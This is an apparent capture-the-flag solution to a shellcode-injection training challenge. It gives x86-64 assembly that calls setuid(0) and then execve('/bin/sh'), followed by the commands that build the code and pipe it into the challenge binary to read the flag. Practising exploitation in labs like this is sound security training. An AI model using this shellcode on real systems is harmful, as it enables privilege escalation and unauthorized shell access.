
This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

[LEAK] Placing shellcode on the stack at 0x7ffe24d60790!
In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.


.global _start
_start: 
.intel_syntax noprefix
	mov rax, 0x69	
	mov rdi, 0
	syscall 
	
	mov rax, 0x3b 		
	lea rdi, [rip+filename]
	mov rsi, 0
	mov rdx, 0
	syscall 

filename:
	.string "/bin/sh"


/*gcc -nostdlib -static test.s -o shellcode
/*objcopy --dump-section .text=shellcode-raw shellcode
/*(cat ./shellcode-raw; cat) | /challenge/babyshell_level1


cat /flag